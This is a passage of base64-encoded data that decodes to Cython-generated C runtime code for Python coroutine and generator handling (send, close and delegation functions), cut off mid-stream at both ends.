4Y19zdGF0ZTsKICAgIHRzdGF0ZS0+ZXhjX2luZm8gPSBleGNfc3RhdGUtPnByZXZpb3VzX2l0ZW07CiAgICBleGNfc3RhdGUtPnByZXZpb3VzX2l0ZW0gPSBOVUxMOwogICAgX19QeXhfQ29yb3V0aW5lX1Jlc2V0RnJhbWVCYWNrcG9pbnRlcihleGNfc3RhdGUpOwojZW5kaWYKICAgICpyZXN1bHQgPSByZXR2YWw7CiAgICBpZiAoc2VsZi0+cmVzdW1lX2xhYmVsID09IC0xKSB7CiAgICAgICAgcmV0dXJuIGxpa2VseShyZXR2YWwpID8gUFlHRU5fUkVUVVJOIDogUFlHRU5fRVJST1I7CiAgICB9CiAgICByZXR1cm4gUFlHRU5fTkVYVDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgQ1lUSE9OX1VOVVNFRF9WQVIoZXhjX3N0YXRlKTsKI2Vsc2UKICAgIFB5T2JqZWN0ICpleGNfdGI7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgaWYgKCFleGNfc3RhdGUtPmV4Y192YWx1ZSkgcmV0dXJuOwogICAgZXhjX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTsKICAgICNlbHNlCiAgICBleGNfdGIgPSBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICAjZW5kaWYKICAgIGlmIChsaWtlbHkoZXhjX3RiKSkgewogICAgICAgIFB5VHJhY2ViYWNrT2JqZWN0ICp0YiA9IChQeVRyYWNlYmFja09iamVjdCAqKSBleGNfdGI7CiAgICAgICAgUHlGcmFtZU9iamVjdCAqZiA9IHRiLT50Yl9mcmFtZTsKICAgICAgICBQeV9DTEVBUihmLT5mX2JhY2spOwogICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICAgICAgUHlfREVDUkVGKGV4Y190Yik7CiAgICAgICAgI2VuZGlmCiAgICB9CiNlbmRpZgp9CiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoZ2VuLCByZXN1bHQsIHJldHZhbCwgaXRlcm5leHQpXAogICAgKChyZXN1bHQpID09IFBZR0VOX05FWFQgPyAocmV0dmFsKSA6IF9fUHl4X19Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChnZW4sIHJlc3VsdCwgcmV0dmFsLCBpdGVybmV4dCkpCnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X19Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChQeU9iamVjdCogZ2VuLCBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0LCBQeU9iamVjdCAqcmV0dmFsLCBpbnQgaXRlcm5leHQpIHsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGdlbik7CiAgICBpZiAobGlrZWx5KHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4pKSB7CiAgICAgICAgaW50IGlzX2FzeW5jID0gMDsKICAgICAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogICAgICAgIGlzX2FzeW5jID0gX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChnZW4pOwogICAgICAgICNlbmRpZgogICAgICAgIF9fUHl4X1JldHVybldpdGhTdG9wSXRlcmF0aW9uKHJldHZhbCwgaXNfYXN5bmMsIGl0ZXJuZXh0KTsKICAgICAgICBQeV9YREVDUkVGKHJldHZhbCk7CiAgICB9CiAgICByZXR1cm4gTlVMTDsKfQojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FClB5T2JqZWN0ICpfX1B5eF9QeUdlbl9TZW5kKFB5R2VuT2JqZWN0ICpnZW4sIFB5T2JqZWN0ICphcmcpIHsKI2lmIFBZX1ZFUlNJT05fSEVYIDw9IDB4MDMwQTAwQTEKICAgIHJldHVybiBfUHlHZW5fU2VuZChnZW4sIGFyZyk7CiNlbHNlCiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgaWYgKFB5SXRlcl9TZW5kKChQeU9iamVjdCopZ2VuLCBhcmcgPyBhcmcgOiBQeV9Ob25lLCAmcmVzdWx0KSA9PSBQWUdFTl9SRVRVUk4pIHsKICAgICAgICBpZiAoUHlBc3luY0dlbl9DaGVja0V4YWN0KGdlbikpIHsKICAgICAgICAgICAgYXNzZXJ0KHJlc3VsdCA9PSBQeV9Ob25lKTsKICAgICAgICAgICAgUHlFcnJfU2V0Tm9uZShQeUV4Y19TdG9wQXN5bmNJdGVyYXRpb24pOwogICAgICAgIH0KICAgICAgICBlbHNlIGlmIChyZXN1bHQgPT0gUHlfTm9uZSkgewogICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX1N0b3BJdGVyYXRpb24pOwogICAgICAgIH0KICAgICAgICBlbHNlIHsKI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDBBMQogICAgICAgICAgICBfUHlHZW5fU2V0U3RvcEl0ZXJhdGlvblZhbHVlKHJlc3VsdCk7CiNlbHNlCiAgICAgICAgICAgIGlmICghUHlUdXBsZV9DaGVjayhyZXN1bHQpICYmICFQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKHJlc3VsdCkpIHsKICAgICAgICAgICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19TdG9wSXRlcmF0aW9uLCByZXN1bHQpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgUHlPYmplY3QgKmV4YyA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoUHlFeGNfU3RvcEl0ZXJhdGlvbiwgcmVzdWx0KTsKICAgICAgICAgICAgICAgIGlmIChsaWtlbHkoZXhjICE9IE5VTEwpKSB7CiAgICAgICAgICAgICAgICAgICAgUHlFcnJfU2V0T2JqZWN0KFB5RXhjX1N0b3BJdGVyYXRpb24sIGV4Yyk7CiAgICAgICAgICAgICAgICAgICAgUHlfREVDUkVGKGV4Yyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KI2VuZGlmCiAgICAgICAgfQogICAgICAgIFB5X0RFQ1JFRihyZXN1bHQpOwogICAgICAgIHJlc3VsdCA9IE5VTEw7CiAgICB9CiAgICByZXR1cm4gcmVzdWx0OwojZW5kaWYKfQojZW5kaWYKc3RhdGljIENZVEhPTl9JTkxJTkUgX19QeXhfUHlTZW5kUmVzdWx0Cl9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuLCBQeU9iamVjdCoqIHJldHZhbCkgewogICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDsKICAgIFB5T2JqZWN0ICp2YWwgPSBOVUxMOwogICAgYXNzZXJ0KF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhnZW4pKTsKICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7CiAgICBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50LCAmdmFsKTsKICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCB2YWwsIHJldHZhbCwgMCk7CiAgICBQeV9YREVDUkVGKHZhbCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CiNpZiBDWVRIT05fVVNFX0FNX1NFTkQKc3RhdGljIF9fUHl4X1B5U2VuZFJlc3VsdApfX1B5eF9Db3JvdXRpbmVfU2VuZFRvRGVsZWdhdGUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBnZW5fYW1fc2VuZCwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJldHZhbCkgewogICAgUHlPYmplY3QgKnJldCA9IE5VTEw7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgZGVsZWdhdGVfcmVzdWx0LCByZXN1bHQ7CiAgICBhc3NlcnQoX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKGdlbikpOwogICAgZGVsZWdhdGVfcmVzdWx0ID0gZ2VuX2FtX3NlbmQoZ2VuLT55aWVsZGZyb20sIHZhbHVlLCAmcmV0KTsKICAgIGlmIChkZWxlZ2F0ZV9yZXN1bHQgPT0gUFlHRU5fTkVYVCkgewogICAgICAgIGFzc2VydCAocmV0ICE9IE5VTEwpOwogICAgICAgICpyZXR2YWwgPSByZXQ7CiAgICAgICAgcmV0dXJuIFBZR0VOX05FWFQ7CiAgICB9CiAgICBhc3NlcnQgKGRlbGVnYXRlX3Jlc3VsdCAhPSBQWUdFTl9FUlJPUiB8fCByZXQgPT0gTlVMTCk7CiAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pOwogICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIHJldCwgcmV0dmFsLCAwKTsKICAgIFB5X1hERUNSRUYocmV0KTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX1NlbmQoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSkgewogICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0FtU2VuZChzZWxmLCB2YWx1ZSwgJnJldHZhbCk7CiAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoc2VsZiwgcmVzdWx0LCByZXR2YWwsIDApOwp9CnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHQKX19QeXhfQ29yb3V0aW5lX0FtU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJldHZhbCkgewogICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCopIHNlbGY7CiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKSB7CiAgICAgICAgKnJldHZhbCA9IF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7CiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SOwogICAgfQogICAgI2lmIENZVEhPTl9VU0VfQU1fU0VORAogICAgaWYgKGdlbi0+eWllbGRmcm9tX2FtX3NlbmQpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZFRvRGVsZWdhdGUoZ2VuLCBnZW4tPnlpZWxkZnJvbV9hbV9zZW5kLCB2YWx1ZSwgcmV0dmFsKTsKICAgIH0gZWxzZQogICAgI2VuZGlmCiAgICBpZiAoZ2VuLT55aWVsZGZyb20pIHsKICAgICAgICBQeU9iamVjdCAqeWYgPSBnZW4tPnlpZWxkZnJvbTsKICAgICAgICBQeU9iamVjdCAqcmV0OwogICAgICAjaWYgIUNZVEhPTl9VU0VfQU1fU0VORAogICAgICAgICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRAogICAgICAgIGlmIChfX1B5eF9HZW5lcmF0b3JfQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmQoeWYsIHZhbHVlKTsKICAgICAgICB9IGVsc2UKICAgICAgICAjZW5kaWYKICAgICAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRUQKICAgICAgICBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgdmFsdWUpOwogICAgICAgIH0gZWxzZQogICAgICAgICNlbmRpZgogICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICAgICAgaWYgKF9fcHl4X1B5QXN5bmNHZW5BU2VuZF9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9hc3luY19nZW5fYXNlbmRfc2VuZCh5ZiwgdmFsdWUpOwogICAgICAgIH0gZWxzZQogICAgICAgICNlbmRpZgogICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICAgICBpZiAoUHlHZW5fQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlHZW5fU2VuZCgoUHlHZW5PYmplY3QqKXlmLCB2YWx1ZSA9PSBQeV9Ob25lID8gTlVMTCA6IHZhbHVlKTsKICAgICAgICB9IGVsc2UKICAgICAgICBpZiAoUHlDb3JvX0NoZWNrRXhhY3QoeWYpKSB7CiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5R2VuX1NlbmQoKFB5R2VuT2JqZWN0Kil5ZiwgdmFsdWUgPT0gUHlfTm9uZSA/IE5VTEwgOiB2YWx1ZSk7CiAgICAgICAgfSBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICNlbmRpZgogICAgICAgIHsKICAgICAgICAgICAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMAogICAgICAgICAgICBpZiAodmFsdWUgPT0gUHlfTm9uZSAmJiBQeUl0ZXJfQ2hlY2soeWYpKQogICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlJdGVyX05leHRfUGxhaW4oeWYpOwogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoeWYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZW5kLCB2YWx1ZSk7CiAgICAgICAgfQogICAgICAgIGlmIChsaWtlbHkocmV0KSkgewogICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgICAgICAqcmV0dmFsID0gcmV0OwogICAgICAgICAgICByZXR1cm4gUFlHRU5fTkVYVDsKICAgICAgICB9CiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0ZpbmlzaERlbGVnYXRpb24oZ2VuLCByZXR2YWwpOwogICAgfSBlbHNlIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgdmFsdWUsIHJldHZhbCwgMCk7CiAgICB9CiAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV9DbG9zZUl0ZXIoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIFB5T2JqZWN0ICp5ZikgewogICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDsKICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoZ2VuKTsKICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoZ2VuKSk7CiAgICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRUQKICAgIGlmIChfX1B5eF9HZW5lcmF0b3JfQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2UoeWYsICZyZXR2YWwpOwogICAgfSBlbHNlCiAgICAjZW5kaWYKICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgaWYgKF9fUHl4X0Nvcm91dGluZV9DaGVjayh5ZikpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2UoeWYsICZyZXR2YWwpOwogICAgfSBlbHNlCiAgICBpZiAoX19QeXhfQ29yb3V0aW5lQXdhaXRfQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVBd2FpdF9DbG9zZSgoX19weXhfQ29yb3V0aW5lQXdhaXRPYmplY3QqKXlmKTsKICAgIH0gZWxzZQogICAgI2VuZGlmCiAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogICAgaWYgKF9fcHl4X1B5QXN5bmNHZW5BU2VuZF9DaGVja0V4YWN0KHlmKSkgewogICAgICAgIHJldHZhbCA9IF9fUHl4X2FzeW5jX2dlbl9hc2VuZF9jbG9zZSh5ZiwgTlVMTCk7CiAgICAgICAgcmVzdWx0ID0gUFlHRU5fUkVUVVJOOwogICAgfSBlbHNlCiAgICBpZiAoX19weXhfUHlBc3luY0dlbkFUaHJvd19DaGVja0V4YWN0KHlmKSkgewogICAgICAgIHJldHZhbCA9IF9fUHl4X2FzeW5jX2dlbl9hdGhyb3dfY2xvc2UoeWYsIE5VTEwpOwogICAgICAgIHJlc3VsdCA9IFBZR0VOX1JFVFVSTjsKICAgIH0gZWxzZQogICAgI2VuZGlmCiAgICB7CiAgICAgICAgUHlPYmplY3QgKm1ldGg7CiAgICAgICAgcmVzdWx0ID0gUFlHRU5fUkVUVVJOOwogICAgICAgIG1ldGggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcih5ZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nsb3NlKTsKICAgICAgICBpZiAodW5saWtlbHkoIW1ldGgpKSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgewogICAgICAgICAgICAgICAgUHlFcnJfV3JpdGVVbnJhaXNhYmxlKHlmKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHZhbCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZyhtZXRoKTsKICAgICAgICAgICAgUHlfREVDUkVGKG1ldGgpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXJldHZhbCkpIHsKICAgICAgICAgICAgICAgIHJlc3VsdCA9IFBZR0VOX0VSUk9SOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgUHlfWERFQ1JFRihyZXR2YWwpOwogICAgcmV0dXJuIHJlc3VsdCA9PSBQWUdFTl9FUlJPUiA/IC0xIDogMDsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dlbmVyYXRvcl9OZXh0KFB5T2JqZWN0ICpzZWxmKSB7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0OwogICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKSBzZWxmOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkgewogICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pOwogICAgfQogICAgI2lmIENZVEhPTl9VU0VfQU1fU0VORAogICAgaWYgKGdlbi0+eWllbGRmcm9tX2FtX3NlbmQpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZFRvRGVsZWdhdGUoZ2VuLCBnZW4tPnlpZWxkZnJvbV9hbV9zZW5kLCBQeV9Ob25lLCAmcmV0dmFsKTsKICAgIH0gZWxzZQogICAgI2VuZGlmCiAgICBpZiAoZ2VuLT55aWVsZGZyb20pIHsKICAgICAgICBQeU9iamVjdCAqeWYgPSBnZW4tPnlpZWxkZnJvbTsKICAgICAgICBQeU9iamVjdCAqcmV0OwogICAgICAgICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRAogICAgICAgIGlmIChfX1B5eF9HZW5lcmF0b3JfQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfR2VuZXJhdG9yX05leHQoeWYpOwogICAgICAgIH0gZWxzZQogICAgICAgICNlbmRpZgogICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgICAgIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmQoeWYsIFB5X05vbmUpOwogICAgICAgIH0gZWxzZQogICAgICAgICNlbmRpZgogICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgKFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDBBMyB8fCAhQ1lUSE9OX1VTRV9BTV9TRU5EKQogICAgICAgIGlmIChQeUdlbl9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9QeUdlbl9TZW5kKChQeUdlbk9iamVjdCopeWYsIE5VTEwpOwogICAgICAgIH0gZWxzZQogICAgICAgICNlbmRpZgogICAgICAgICAgICByZXQgPSBfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbih5Zik7CiAgICAgICAgaWYgKGxpa2VseShyZXQpKSB7CiAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAgICAgICAgIHJldHVybiByZXQ7CiAgICAgICAgfQogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKGdlbiwgJnJldHZhbCk7CiAgICB9IGVsc2UgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCBQeV9Ob25lLCAmcmV0dmFsLCAwKTsKICAgIH0KICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoc2VsZiwgcmVzdWx0LCByZXR2YWwsIDEpOwp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX0Nsb3NlX01ldGhvZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZykgewogICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0OwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoYXJnKTsKICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZShzZWxmLCAmcmV0dmFsKTsKICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gUFlHRU5fRVJST1IpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgUHlfWERFQ1JFRihyZXR2YWwpOwogICAgUHlfUkVUVVJOX05PTkU7Cn0Kc3RhdGljIF9fUHl4X1B5U2VuZFJlc3VsdApfX1B5eF9Db3JvdXRpbmVfQ2xvc2UoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICoqcmV0dmFsKSB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjsKICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7CiAgICBQeU9iamVjdCAqeWY7CiAgICBpbnQgZXJyID0gMDsKICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpIHsKICAgICAgICAqcmV0dmFsID0gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTsKICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7CiAgICB9CiAgICB5ZiA9IGdlbi0+eWllbGRmcm9tOwogICAgaWYgKHlmKSB7CiAgICAgICAgUHlfSU5DUkVGKHlmKTsKICAgICAgICBlcnIgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2VJdGVyKGdlbiwgeWYpOwogICAgICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7CiAgICAgICAgUHlfREVDUkVGKHlmKTsKICAgIH0KICAgIGlmIChlcnIgPT0gMCkKICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX0dlbmVyYXRvckV4aXQpOwogICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIE5VTEwsIHJldHZhbCwgMSk7CiAgICBpZiAocmVzdWx0ID09IFBZR0VOX0VSUk9SKSB7CiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgIGlmICghX19QeXhfUHlFcnJfT2NjdXJyZWQoKSkgewogICAgICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOOwogICAgICAgIH0gZWxzZSBpZiAobGlrZWx5KF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMyKFB5RXhjX0dlbmVyYXRvckV4aXQsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkgewogICAgICAgICAgICBfX1B5eF9QeUVycl9DbGVhcigpOwogICAgICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOOwogICAgICAgIH0KICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7CiAgICB9IGVsc2UgaWYgKGxpa2VseShyZXN1bHQgPT0gUFlHRU5fUkVUVVJOICYmICpyZXR2YWwgPT0gUHlfTm9uZSkpIHsKICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgIHJldHVybiBQWUdFTl9SRVRVUk47CiAgICB9IGVsc2UgewogICAgICAgIGNvbnN0IGNoYXIgKm1zZzsKICAgICAgICBQeV9ERUNSRUYoKnJldHZhbCk7CiAgICAgICAgKnJldHZhbCA9IE5VTEw7CiAgICAgICAgaWYgKCgwKSkgewogICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgICAgIH0gZWxzZSBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKHNlbGYpKSB7CiAgICAgICAgICAgIG1zZyA9ICJjb3JvdXRpbmUgaWdub3JlZCBHZW5lcmF0b3JFeGl0IjsKICAgICAgICAjZW5kaWYKICAgICAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogICAgICAgIH0gZWxzZSBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkgewogICAgICAgICAgICBtc2cgPSAiYXN5bmMgZ2VuZXJhdG9yIGlnbm9yZWQgR2VuZXJhdG9yRXhpdCI7CiAgICAgICAgI2VuZGlmCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgbXNnID0gImdlbmVyYXRvciBpZ25vcmVkIEdlbmVyYXRvckV4aXQiOwogICAgICAgIH0KICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfUnVudGltZUVycm9yLCBtc2cpOwogICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SOwogICAgfQp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9UaHJvdyhQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCwgUHlPYmplY3QgKnZhbCwgUHlPYmplY3QgKnRiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmFyZ3MsIGludCBjbG9zZV9vbl9nZW5leGl0KSB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjsKICAgIFB5T2JqZWN0ICp5ZjsKICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpCiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7CiAgICB5ZiA9IGdlbi0+eWllbGRmcm9tOwogICAgaWYgKHlmKS